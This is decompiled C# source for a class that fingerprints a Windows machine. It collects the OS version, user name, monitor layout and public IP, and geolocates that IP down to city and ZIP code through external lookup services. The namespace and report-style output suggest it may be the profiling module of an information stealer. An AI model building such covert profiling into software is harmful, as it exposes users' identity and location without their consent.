using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using sexas.Logic.Extensions;
using sexas.Logic.Json;

namespace hostik;

public static class PCI
{
	public static List<string> info = new List<string>();

	public static string GetIP()
	{
		try
		{
			return new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[1] { ':' })[1].Substring(1).Split(new char[1] { '<' })[0];
		}
		catch
		{
			return "";
		}
	}

	public static List<string> GetWindowsInfo()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
		list.Add("Hardware Info");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				list.Add(string.Format("\nBuildNumber: {0}", ((ManagementBaseObject)val2).get_Item("BuildNumber")));
				list.Add(string.Format("\nCaption: {0}", ((ManagementBaseObject)val2).get_Item("Caption")));
				list.Add("\nLanguage: " + CultureInfo.InstalledUICulture.DisplayName);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		list.Add("\nUser: " + WindowsIdentity.GetCurrent().Name);
		list.Add("\n\nMonitor info\n" + GetMonitor());
		IPI userCountryByIp = GetUserCountryByIp(GetIP());
		list.Add("\n\nGeo info");
		list.Add("\nIp info: " + GetIP());
		list.Add("\nCountry: " + userCountryByIp.Country);
		list.Add("\nCity: " + userCountryByIp.City);
		list.Add("\nRegion: " + userCountryByIp.Region);
		list.Add("\nZIP code: " + userCountryByIp.Postal);
		list.Add($"\nTimezone: UTC({TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)})");
		return list;
	}

	private static string GetMonitor()
	{
		StringBuilder stringBuilder = new StringBuilder();
		Screen[] allScreens = Screen.get_AllScreens();
		foreach (Screen val in allScreens)
		{
			stringBuilder.AppendLine("Name: " + val.get_DeviceName());
			stringBuilder.AppendLine($"Width: {val.get_WorkingArea().Width}");
			stringBuilder.AppendLine($"Height: {val.get_WorkingArea().Height}");
		}
		return stringBuilder.ToString();
	}

	public static IPI GetUserCountryByIp(string ip)
	{
		IPI iPI = new IPI();
		try
		{
			JsonValue jsonValue = new WebClient().DownloadString("http://ipinfo.io/" + ip).FromJSON();
			iPI.City = jsonValue["city"];
			iPI.Ip = jsonValue["ip"].ToString(saving: false);
			iPI.Postal = jsonValue["postal"];
			iPI.Region = jsonValue["region"];
			RegionInfo regionInfo = new RegionInfo(jsonValue["country"].ToString(saving: false));
			iPI.Country = regionInfo.EnglishName;
			return iPI;
		}
		catch
		{
			return iPI;
		}
	}
}
